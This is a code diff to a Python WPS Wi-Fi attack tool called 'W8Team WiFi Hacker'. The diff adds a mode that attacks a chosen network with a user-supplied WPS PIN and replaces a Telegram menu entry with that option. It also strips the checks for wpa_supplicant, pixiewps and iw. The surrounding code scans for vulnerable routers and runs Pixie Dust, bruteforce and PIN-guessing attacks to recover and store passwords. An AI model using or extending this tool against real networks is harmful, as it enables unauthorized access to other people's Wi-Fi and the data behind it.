@@ -789,56 +789,58 @@ class MenuHandler:
         except:
             return "wlan0"
             
-    def show_wifi_networks(self, attack_mode="pixie"):
+    def show_wifi_networks(self, attack_mode="pixie", pin=None):
         """Show available networks and let user select"""
         try:
             with open('vulnwsc.txt', 'r', encoding='utf-8') as file:
                 vuln_list = file.read().splitlines()
         except FileNotFoundError:
             vuln_list = []
-            
+
         scanner = WiFiScanner(self.interface, vuln_list, reverse_scan=False)
         networks = scanner.iw_scanner()
-        
+
         if not networks:
             print("[-] No WPS networks found")
             return None
-            
+
         while True:
             try:
                 choice = input("\n[?] Select network number (or 'r' to rescan): ").strip()
                 if choice.lower() == 'r':
-                    return self.show_wifi_networks(attack_mode)
-                    
+                    return self.show_wifi_networks(attack_mode, pin)
+
                 network_num = int(choice)
                 if network_num in networks:
                     selected_network = networks[network_num]
-                    return self._attack_selected_network(selected_network, attack_mode)
+                    return self._attack_selected_network(selected_network, attack_mode, pin)
                 else:
                     print("[-] Invalid selection")
             except ValueError:
                 print("[-] Please enter a valid number")
             except KeyboardInterrupt:
                 return None
-                
-    def _attack_selected_network(self, network, attack_mode):
+
+    def _attack_selected_network(self, network, attack_mode, pin=None):
         """Attack the selected network"""
         bssid = network['BSSID']
         essid = network['ESSID']
-        
+
         print(f"\n[*] 🎯 Attacking: {essid} ({bssid})")
         print(f"[*] Method: {attack_mode}")
-        
+
         companion = Companion(self.interface, save_result=True)
-        
+
         start_time = time.time()
-        
+
         if attack_mode == "pixie":
             success = companion.single_connection(bssid, pixiemode=True)
         elif attack_mode == "bruteforce":
             success = companion.smart_bruteforce(bssid)
         elif attack_mode == "ai_pin":
             success = self._ai_pin_attack(companion, bssid)
+        elif attack_mode == "custom_pin":
+            success = companion.single_connection(bssid, pin=pin)
         else:
             success = False
             
@@ -1261,36 +1263,15 @@ class MenuHandler:
             print("[*] Attack some networks first to save passwords!")
             
         input("\n[+] Press Enter to continue...")
-        
-    def open_telegram(self):
-        """Open Telegram link"""
-        telegram_url = "https://t.me/W8SOJIB"
-        print(f"\n[*] 📱 Opening Telegram: {telegram_url}")
-        
-        try:
-            # Try different methods to open URL in Termux
-            commands = [
-                f"am start -a android.intent.action.VIEW -d {telegram_url}",
-                f"termux-open-url {telegram_url}",
-                f"xdg-open {telegram_url}"
-            ]
-            
-            for cmd in commands:
-                try:
-                    subprocess.run(cmd, shell=True, check=True)
-                    print("[+] ✅ Telegram opened successfully!")
-                    break
-                except:
-                    continue
-            else:
-                print(f"[*] Manual link: {telegram_url}")
-                print("[*] Copy and paste the link in your browser/Telegram")
-                
-        except Exception as e:
-            print(f"[-] Error opening Telegram: {e}")
-            print(f"[*] Manual link: {telegram_url}")
-            
-        input("\n[+] Press Enter to continue...")
+
+    def enter_pin_and_get_key(self):
+        """Enter a PIN and get the key"""
+        pin = input("\n[?] Enter the WPS PIN: ").strip()
+        if not pin.isdigit() or len(pin) not in [4, 8]:
+            print("[-] Invalid PIN. Please enter a 4 or 8-digit PIN.")
+            return
+
+        self.show_wifi_networks(attack_mode="custom_pin", pin=pin)
         
     def run_menu(self):
         """Main menu loop"""
@@ -1319,7 +1300,7 @@ class MenuHandler:
                     self.view_saved_passwords()
                     
                 elif choice == "6":
-                    self.open_telegram()
+                    self.enter_pin_and_get_key()
                     
                 elif choice == "7":
                     print("\n[*] 👋 Thanks for using W8Team WiFi Hacker!")
@@ -1371,8 +1352,6 @@ class Companion:
         self.generator = WPSpin()
 
     def __init_wpa_supplicant(self):
-        if not shutil.which("wpa_supplicant"):
-            die("[!] wpa_supplicant not found. Please install it to use this tool.")
         print('[*] Running wpa_supplicant…')
         cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
         self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
@@ -1507,9 +1486,6 @@ class Companion:
         return True
 
     def __runPixiewps(self, showcmd=False, full_range=False):
-        if not shutil.which("pixiewps"):
-            print("[!] Pixiewps not found. Please install it to use this feature.")
-            return False
         print("[*] Running Pixiewps…")
         cmd = self.pixie_creds.get_pixie_cmd(full_range)
         if showcmd:
@@ -1847,13 +1823,9 @@ class WiFiScanner:
             networks[-1]['Device name'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
 
         cmd = 'iw dev {} scan'.format(self.interface)
-        try:
-            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
-                                  stderr=subprocess.STDOUT, encoding='utf-8', errors='replace', check=True)
-            lines = proc.stdout.splitlines()
-        except (subprocess.CalledProcessError, FileNotFoundError):
-            print(f"[!] Error running '{cmd}'. Make sure 'iw' is installed and you have permissions.")
-            return False
+        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
+                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
+        lines = proc.stdout.splitlines()
         networks = []
         matchers = {
             re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
@@ -2091,7 +2063,7 @@ def show_main_menu():
 ║  [3] 🔥 BruteForce Attack - Scan, Select & PIN Attack       ║
 ║  [4] 🤖 AI PIN Prediction - ALL 100 Million PINs Attack     ║
 ║  [5] 📋 View All Saved Passwords                            ║
-║  [6] 📱 Tool Author - Open Telegram                         ║
+║  [6] ✍️ Enter Pin and Get Key                               ║
 ║  [7] 🚪 Exit                                                ║
 ╚══════════════════════════════════════════════════════════════╝
     """
